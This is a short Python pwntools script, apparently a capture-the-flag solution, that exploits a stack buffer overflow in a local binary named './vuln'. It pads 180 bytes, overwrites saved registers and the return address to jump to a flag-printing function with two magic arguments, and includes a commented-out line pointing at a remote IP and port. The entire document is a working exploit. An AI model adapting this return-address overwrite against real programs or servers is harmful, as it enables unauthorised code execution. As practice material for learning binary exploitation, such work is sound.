#!/usr/bin/python3
from pwn import *

context.log_level = "debug"

context.arch = "i386"
r = process("./vuln")
# r = remote("124.16.75.117", 51008)


buf_len = 180
flag_addr = 0x080491F6
dead_beef = 0xDEADBEEF
code_dood = 0xC0DED00D
exit_addr = 0x08049241
gdb.attach(r, "b *0x080492c4")
r.sendlineafter(
    "Please enter your string: ",
    b"a" * buf_len
    + b"b" * 4  # ebx
    + b"c" * 4  # ebp
    + p32(flag_addr)
    + p32(exit_addr)  # ret
    + p32(dead_beef)
    + p32(code_dood),
)
r.interactive()
